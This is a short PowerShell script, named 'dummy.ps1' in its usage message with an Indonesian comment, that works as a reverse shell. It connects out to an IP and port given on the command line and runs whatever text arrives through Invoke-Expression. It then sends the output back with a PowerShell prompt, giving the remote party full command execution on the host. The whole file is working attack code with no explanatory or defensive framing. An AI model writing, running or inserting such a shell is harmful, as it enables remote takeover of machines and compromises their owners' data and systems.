param (
    [string]$l,
    [int]$p
)

# Pastikan IP dan port valid
if (-not $l -or -not $p) {
    Write-Host "Usage: dummy.ps1 -l <IP> -p <Port>"
    exit
}

$client = New-Object System.Net.Sockets.TCPClient($l, $p)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true
$buffer = New-Object System.Byte[] 1024
$encoding = New-Object System.Text.ASCIIEncoding

try {
    while ($true) {
        $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
        if ($bytesRead -le 0) {
            break
        }
        
        $data = $encoding.GetString($buffer, 0, $bytesRead)
        $output = try {
            Invoke-Expression $data 2>&1 | Out-String
        } catch {
            $_.Exception.Message
        }
        $output += "PS " + (Get-Location).Path + "> "
        $writer.Write($output)
    }
} finally {
    $writer.Close()
    $stream.Close()
    $client.Close()
}
